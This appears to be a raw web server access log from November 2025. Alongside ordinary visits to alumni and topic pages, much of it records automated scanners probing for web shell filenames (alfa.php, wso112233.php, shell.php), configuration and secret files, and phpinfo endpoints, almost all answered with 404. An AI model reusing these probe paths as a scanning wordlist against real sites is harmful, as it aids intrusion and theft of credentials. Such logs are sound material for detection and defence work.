55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:22;/;/wp-content/uploads/class.api.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:23;/;/abcd.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:23;/;/ds.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:24;/;/alfa.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:24;/;/hplfuns.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:24;/;/file.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:25;/;/adminfuns.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:25;/;/wp-admin/css/colors/blue/index.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:25;/;/wp-content/index.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:26;/;/wp-content/uploads/index.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:26;/;/moon.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:26;/;/wp-admin/includes;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:27;/;/goods.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:27;/;/wp-content/upgrade/index.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:28;/;/wp-good.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:29;/;/xmrlpc.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:29;/;/info.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:29;/;/.__info.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:30;/;/xmlrpc.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:30;/;/ALFA_DATA/admin.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:31;/;/aaa.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:31;/;/admin/admin.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:32;/;/akcc.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:32;/;/build.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:32;/;/chosen.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:33;/;/filemanager.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:33;/;/flower.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:33;/;/function/function.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:34;/;/images/index.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:35;/;/images/images/about.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:37;/;/mari.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:37;/;/nc4.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:37;/;/wp-admin/about.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:38;/;/wp-includes/style-engine/index.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:38;/;/xleet.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:39;/;/wp-admin/includes/;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:39;/;/wp-content/uploads/admin.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:39;/;/wp-includes/Text/Diff/Renderer/;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:39;/;/wp-includes/style-engine/;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:40;/;/asasx.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:41;/;/file2.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:41;/;/wp-content/plugins/yanierin/akcc.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:41;/;/wp-content/wp-conflg.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:42;/;/wp-cron.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:43;/;/wp-includes/IXR/;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:43;/;/wp-includes/block-supports/;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:43;/;/wp-includes/fonts/;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:44;/;/wp-includes/fonts/index.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:44;/;/wp-includes/js/crop/;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:44;/;/wp-includes/rest-api/;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:45;/;/wp-includes/widgets/;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:45;/;/f5.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:46;/;/god4m.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:47;/;/uploads/;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:48;/;/0.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:49;/;/07.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:49;/;/dropdown.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:50;/;/makeasmtp.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:50;/;/wp-sigunq.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:52;/;/wso112233.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:52;/;/alfanew.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:53;/;/fw.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:53;/;/install.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:53;/;/wp-login.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:53;/;/simple.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:54;/;/inputs.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:54;/;/classsmtps.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:54;/;/wp-blog-header.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:55;/;/wp-trackback.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:55;/;/wp-signup.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:56;/;/wp-comments-post.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:56;/;/wp-load.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:57;/;/wp-mail.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:57;/;/wp-activate.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:58;/;/plugins.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:58;/;/post.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:59;/;/wp-2019.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:20:59;/;/geju.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:00;/;/wp.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:00;/;/hoot.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:01;/;/css.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:02;/;/log.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:02;/;/mail.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:03;/;/bak.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:03;/;/content.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:03;/;/upfile.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:04;/;/wp-conflg.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:04;/;/bypass.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:04;/;/404.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:05;/;/updates.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:05;/;/radio.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:06;/;/ae.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:07;/;/blog.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:07;/;/themes.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:07;/;/ini.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:08;/;/as.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:08;/;/shell.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:09;/;/ws.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:10;/;/123.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:11;/;/9.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:11;/;/admin-ajax.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:12;/;/akc.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:13;/;/asd.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:13;/;/axx.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:13;/;/berax.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:14;/;/checkbox.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:14;/;/file4.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:14;/;/form.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:15;/;/gecko.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:16;/;/kyami.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:16;/;/manager.php;GET;404
55322a9ca656c9a544dee03e976f3bd225b3283bed53a58ca3fd00c31eeec3cf;2025-11-21 08:21:17;/;/wp-admin.php;GET;404
f0b2ec5a7d46547c90414f3184f0a3f4a0e375f6468e0a317a6e8ed86d8d7702;2025-11-21 08:21:58;;/;GET;200
2a5dc2ff2064af00fe3d404c31dae68f88e71ae5c3926cb8b90b3c7c69b890db;2025-11-21 08:25:02;;/themen;GET;200
7078e80e957c82ddae919864f8742823cc44ce40b0bd39e6959b035420bcc9a8;2025-11-21 08:26:15;;//wp-includes/ID3/license.txt;GET;404
7078e80e957c82ddae919864f8742823cc44ce40b0bd39e6959b035420bcc9a8;2025-11-21 08:26:16;;//feed/;GET;404
7078e80e957c82ddae919864f8742823cc44ce40b0bd39e6959b035420bcc9a8;2025-11-21 08:26:16;;//xmlrpc.php?rsd;GET;404
7078e80e957c82ddae919864f8742823cc44ce40b0bd39e6959b035420bcc9a8;2025-11-21 08:26:16;;//blog/wp-includes/wlwmanifest.xml;GET;404
7078e80e957c82ddae919864f8742823cc44ce40b0bd39e6959b035420bcc9a8;2025-11-21 08:26:16;;//web/wp-includes/wlwmanifest.xml;GET;404
7078e80e957c82ddae919864f8742823cc44ce40b0bd39e6959b035420bcc9a8;2025-11-21 08:26:16;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
7078e80e957c82ddae919864f8742823cc44ce40b0bd39e6959b035420bcc9a8;2025-11-21 08:26:16;;//wp/wp-includes/wlwmanifest.xml;GET;404
7078e80e957c82ddae919864f8742823cc44ce40b0bd39e6959b035420bcc9a8;2025-11-21 08:26:16;;//2020/wp-includes/wlwmanifest.xml;GET;404
7078e80e957c82ddae919864f8742823cc44ce40b0bd39e6959b035420bcc9a8;2025-11-21 08:26:16;;//2019/wp-includes/wlwmanifest.xml;GET;404
7078e80e957c82ddae919864f8742823cc44ce40b0bd39e6959b035420bcc9a8;2025-11-21 08:26:16;;//2021/wp-includes/wlwmanifest.xml;GET;404
7078e80e957c82ddae919864f8742823cc44ce40b0bd39e6959b035420bcc9a8;2025-11-21 08:26:16;;//shop/wp-includes/wlwmanifest.xml;GET;404
7078e80e957c82ddae919864f8742823cc44ce40b0bd39e6959b035420bcc9a8;2025-11-21 08:26:16;;//wp1/wp-includes/wlwmanifest.xml;GET;404
7078e80e957c82ddae919864f8742823cc44ce40b0bd39e6959b035420bcc9a8;2025-11-21 08:26:17;;//test/wp-includes/wlwmanifest.xml;GET;404
7078e80e957c82ddae919864f8742823cc44ce40b0bd39e6959b035420bcc9a8;2025-11-21 08:26:17;;//site/wp-includes/wlwmanifest.xml;GET;404
7078e80e957c82ddae919864f8742823cc44ce40b0bd39e6959b035420bcc9a8;2025-11-21 08:26:17;;//cms/wp-includes/wlwmanifest.xml;GET;404
e8b3eefc24fd73bd60d872b5caa2c3a26caa3d4066ca09240104eeecc5a7b138;2025-11-21 08:27:17;/;/;GET;200
6fc7e22bea5c3f66a43b7ba251109ccbdc0e63e5aa366a469b02edc35d9c2fa3;2025-11-21 08:36:57;;/personen/alumni/schule/4240016;GET;200
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-21 08:46:52;;/app_dev.php/_profiler/phpinfo;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-21 08:46:53;;/?phpinfo=-1;GET;200
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-21 08:46:55;;/config.yaml;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-21 08:46:56;;/env.example;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-21 08:46:57;;/config.ini;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-21 08:46:58;;/test1.php;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-21 08:46:59;;/admin/infophp.php;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-21 08:47:00;;/settings.inc.php;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-21 08:47:01;;/settings.cfg;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-21 08:47:02;;/robomongo.json;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-21 08:47:04;;/config/config.js;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-21 08:47:05;;/settings.py;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-21 08:47:06;;/Admin/test;GET;404
f841e8f7cc65efb20dcf4cf56afbcdf2110e4ac8824bcd422a6b21be8200f188;2025-11-21 08:47:06;;/v1/test;GET;404
5a197686291db320d2380f0c3d9afe386fc8334a4c8be7dd246d85646ee8a532;2025-11-21 08:48:33;;/personen/alumni/schule/5826;GET;200
edbc5187ea9e1b4f340ca05a2b6cc100bcdd16258a1c6eb84d55d894d14c44b1;2025-11-21 08:50:07;;/;GET;200
5a61fe69b77e4c8460d6e96c7ae3ee222e2522a221cc40e917449d64d6db9a91;2025-11-21 08:56:35;/;/;PROPFIND;405
5e225a61a33b1bba0145569ba54587778ebefe41080850e5fde5b030baff5ed8;2025-11-21 09:00:17;;/personen/alumni/schule/67210;GET;200
ff53fbd5a81532866dbc1879bf4f0bf5eb8ded17d1bc2527e6a495a4b22bef7f;2025-11-21 09:00:46;;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
0b2024fdb6516c3f972fed608490c1e2b43f612b789f9b0a7b670c7c65970141;2025-11-21 09:04:14;;/;GET;200
ff53fbd5a81532866dbc1879bf4f0bf5eb8ded17d1bc2527e6a495a4b22bef7f;2025-11-21 09:04:42;;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
d434b05b4bffcc5dbc96e85c0bbca469321c7ab87e29ec83280cd45bf6058760;2025-11-21 09:06:04;;/;GET;200
a7ff843ae4721156261a7e2a78794b7401017cec842e6bbf0c9114eff9717287;2025-11-21 09:12:05;;/personen/alumni/schule/MP002;GET;200
9531f066db44807114025f18bee82c0c47d14646dd96310537f83fb28361a3f7;2025-11-21 09:17:29;/;/;GET;200
6702a3ab37840b96d3035327042d038fa2726747f1410aa2c5735ddfa003333f;2025-11-21 09:19:05;;/;GET;200
31169b9eb40c86dedb867299f91b64b06dc8e1138b905281b349b3d6cd78e485;2025-11-21 09:22:42;;/;GET;200
c0c780b217e59234931049fe33e72e172f7b7c9aae24f15d2d8c30728915e0f9;2025-11-21 09:22:45;;/;GET;200
a3485f2a05539b11cd2217f9cd469a30771fe1343aecd9f29ad0ab2304d4293d;2025-11-21 09:23:50;;/personen/alumni/schule/4440012;GET;200
1b60b90089f7e91b413e2d5090d939af718f326e1e2eba83d89d5a6455990e02;2025-11-21 09:26:42;;/aktuelles/meldungen?category=community;GET;200
5f180a1a78671703bedbb0db07fd88f57144c7c9056c840918ddd890e3cc9a8b;2025-11-21 09:34:39;;/perso;GET;404
bddaf38dcfee1f49ec2db3bb44c3c75be87bef16a9ac38856effe621ec1a5c11;2025-11-21 09:35:07;;/personen/alumni/schule/59043;GET;200
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:54;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:54;;/htaccess.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:54;;/readme.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:54;;/blurbs.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:54;;/hob.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:54;;/kal.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:54;;/fv.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:55;;/lx.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:55;;/w1w.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:55;;/Contrller.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:55;;/cafe.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:55;;/ww2.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:56;;/ww3.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:56;;/as.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:56;;/wsd.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:56;;/403.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:56;;/max.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:56;;/m.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:56;;/post.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:56;;/themes.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:57;;/wp-content/themes/astra/inc/ki1k.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:57;;/ALFA_DATA/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:57;;/wp-admin/maint/about.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:57;;/wp-admin/network/wp-conflg.php?p=;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:57;;/click.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:57;;/install.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:57;;/lv.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:57;;/simple.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:58;;/13k.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:58;;/css.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:58;;/yellow.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:58;;/cong.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:58;;/fw.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:58;;/bs1.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:58;;/wp-includes/images/wp-login.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:58;;/termps.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:58;;/co.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:59;;/cong.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:59;;/atomlib.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:59;;/w.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:59;;/404.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:35:59;;/ioxi-o.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:00;;/wp-content/product.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:00;;/wp-content/function.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:00;;/0x.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:00;;/css.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:00;;/222.php;GET;404
